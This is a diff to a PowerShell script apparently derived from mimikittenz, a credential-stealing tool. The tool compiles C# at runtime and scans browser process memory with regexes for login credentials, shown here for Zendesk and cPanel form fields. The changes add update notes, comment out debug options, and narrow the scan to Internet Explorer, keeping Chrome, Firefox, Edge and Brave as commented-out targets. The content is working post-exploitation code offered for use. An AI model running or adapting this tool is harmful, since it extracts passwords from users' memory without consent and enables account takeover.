@@ -7,7 +7,12 @@ Extracts juicy info from memory.
 	
 Author: Jamieson O'Reilly (https://au.linkedin.com/in/jamieson-o-reilly-13ab6470)
 License: https://creativecommons.org/licenses/by/4.0/
+Updates: @awsmhacks
+UpdateNotes: really only works for IE..... feel free to experiment. Verified working with the github regex. Aug.2021
 
+TODO:
+	Regex's probably need updating
+	
 
 .DESCRIPTION
 	
@@ -443,7 +448,7 @@ $addTypeCommand = Get-Command -Name 'Add-Type'
 $addTypeCommandInstance = [Activator]::CreateInstance($addTypeCommand.ImplementingType)
 $resolveAssemblyMethod = $addTypeCommand.ImplementingType.GetMethod('ResolveReferencedAssembly', [Reflection.BindingFlags]'NonPublic, Instance')
 $compilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
-$compilerParameters.CompilerOptions = '/debug-'
+#$compilerParameters.CompilerOptions = '/debug-'
 
 $ReferencedAssemblies = 
 @(
@@ -458,11 +463,11 @@ $ReferencedAssemblies =
 
 foreach ($reference in $ReferencedAssemblies)
 {
-    $reference
+    #$reference
     $resolvedAssembly = $resolveAssemblyMethod.Invoke($addTypeCommandInstance, $reference)
     $compilerParameters.ReferencedAssemblies.Add($resolvedAssembly)
 }
-$compilerParameters.IncludeDebugInformation = $false
+#$compilerParameters.IncludeDebugInformation = $true
 
 Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $compilerParameters
 
@@ -550,8 +555,18 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $compiler
     [mimikittenz.MemProcInspector]::AddRegex("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}")
     #Cpanel
     [mimikittenz.MemProcInspector]::AddRegex("Cpanel","user=.{1,50}&pass=.{1,50}")
+
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
-$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
+Write-Output "Starting at $(Get-Date)"
+
+#$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox","msedge","brave")
+$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore")
+#$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("chrome")
+#$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox")
+#$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("msedge")
+#$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("brave")
+
+Write-Output "Finished at $(Get-Date)"
 
 write-output $matchesFound
 }
